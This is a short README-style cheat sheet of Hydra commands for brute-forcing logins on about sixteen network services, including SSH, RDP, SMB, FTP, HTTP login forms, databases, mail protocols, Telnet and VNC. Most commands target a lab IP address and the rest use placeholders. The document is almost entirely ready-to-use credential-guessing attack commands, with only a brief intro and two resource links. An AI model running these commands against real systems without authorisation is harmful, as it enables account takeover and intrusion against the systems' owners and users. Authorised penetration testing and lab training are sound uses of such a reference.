# hack-Cheat-Sheets
This repo has a collection of snippets of codes and commands to help our lives! The main purpose is not be a crutch, this is a way to do not waste our precious time.


## Resources
i find these Repos very userfull 
- [Kali linux cheat sheet](https://github.com/NoorQureshi/kali-linux-cheatsheet)
- [Pentesting Tactics](https://hackviser.com/tactics/pentesting)

---
## Ninja Table
1. [Hydra cheat sheet](#1-Hydra-Cheat-Sheet)


---




## 1. Hydra Cheat Sheet


## RDP
```bash
hydra -V -f -L usernames.txt -P passwords.txt rdp://10.0.2.5 -V
```

## SSH

```bash
hydra -l root -P passwords.txt -f ssh://10.0.2.5 -V
```

## SMB

```bash
hydra -l Administrator -P passwords.txt -f smb://10.0.2.5 -V
```

## FTP

```bash
hydra -l root -P passwords.txt -f ftp://10.0.2.5 -V
```

## HTTP Basic Auth

```bash
hydra -L users.txt -P password.txt 10.0.2.5 http-get /login/ -V
```

## HTTP POST

```bash
hydra -L users.txt -P password.txt 10.0.2.5 http-post-form \
"/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
```

## IMAP

```bash
hydra -l root -P passwords.txt -f imap://10.0.2.5 -V
```

## MySQL

```bash
hydra -L usernames.txt -P pass.txt -f mysql://10.0.2.5 -V
```

## POP3

```bash
hydra -l USERNAME -P passwords.txt -f pop3://10.0.2.5 -V
```

## Redis

```bash
hydra -P password.txt redis://10.0.2.5 -V
```

## Rexec

```bash
hydra -l root -P password.txt rexec://10.0.2.5 -V
```

## Rlogin

```bash
hydra -l root -P password.txt rlogin://10.0.2.5 -V
```

## RSH

```bash
hydra -L username.txt rsh://10.0.2.5 -V
```

## RTSP

```bash
hydra -l root -P passwords.txt <IP> rtsp
```

## SMTP

```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V  # Port 587 for SMTP with SSL
```

## Telnet

```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
```

## VNC

```bash
hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt -s <PORT> <IP> vnc
```

